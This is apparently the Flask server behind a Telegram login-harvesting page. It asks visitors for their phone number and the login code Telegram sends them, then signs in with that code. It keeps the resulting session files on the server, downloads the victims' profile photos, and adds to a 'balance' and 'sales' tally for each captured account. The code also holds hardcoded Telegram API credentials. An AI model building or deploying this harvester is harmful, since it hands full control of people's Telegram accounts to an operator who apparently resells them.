import os
import json
import asyncio
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from telethon import TelegramClient, functions, types

app = Flask(__name__)
CORS(app)

# --- إعدادات التيليجرام (جيبهم من my.telegram.org) ---
API_ID = '39488670' 
API_HASH = '9f8c26ed7b1467b4d10808865d7e33cb'

# المجلدات المطلوبة
SESSION_DIR = 'sessions'
PHOTO_DIR = 'static/photos'
DB_FILE = 'database.json'

for folder in [SESSION_DIR, PHOTO_DIR]:
    if not os.path.exists(folder):
        os.makedirs(folder)

# --- إدارة قاعدة البيانات البسيطة ---
def get_db():
    if not os.path.exists(DB_FILE):
        return {"balance": 13.05, "sales": 434} # أرقام البداية زي الفيديو
    with open(DB_FILE, 'r') as f:
        return json.load(f)

def update_db(balance_add, sales_add):
    db = get_db()
    db['balance'] += balance_add
    db['sales'] += sales_add
    with open(DB_FILE, 'w') as f:
        json.dump(db, f)

# مخزن مؤقت للعملاء النشطين أثناء تسجيل الدخول
active_clients = {}

# --- المسارات (Endpoints) ---

@app.route('/static/photos/<path:filename>')
def serve_photos(filename):
    return send_from_directory(PHOTO_DIR, filename)

@app.route('/get_stats', methods=['GET'])
def get_stats():
    return jsonify(get_db())

@app.route('/send_code', methods=['POST'])
async def send_code():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({"status": "error", "message": "Phone number is required"}), 400

    client = TelegramClient(os.path.join(SESSION_DIR, phone), API_ID, API_HASH)
    await client.connect()
    
    try:
        sent_code = await client.send_code_request(phone)
        active_clients[phone] = {
            "client": client,
            "hash": sent_code.phone_code_hash
        }
        return jsonify({"status": "success", "hash": sent_code.phone_code_hash})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/verify_code', methods=['POST'])
async def verify_code():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    otp_hash = data.get('hash')

    if phone not in active_clients:
        return jsonify({"status": "error", "message": "Session expired"}), 400

    client = active_clients[phone]['client']
    
    try:
        # تسجيل الدخول
        await client.sign_in(phone, code, phone_code_hash=otp_hash)
        
        # جلب بيانات المستخدم
        me = await client.get_me()
        user_id = me.id
        user_name = me.first_name or "Telegram User"
        
        # تحميل صورة البروفايل
        photo_path = await client.download_profile_photo(os.path.join(PHOTO_DIR, f"{user_id}.jpg"))
        photo_url = f"http://localhost:5000/static/photos/{user_id}.jpg" if photo_path else ""

        # تحديث الحسابات
        update_db(0.45, 1)
        
        # تنظيف المخزن المؤقت
        del active_clients[phone]
        
        return jsonify({
            "status": "success",
            "user_id": user_id,
            "user_name": user_name,
            "photo_url": photo_url
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
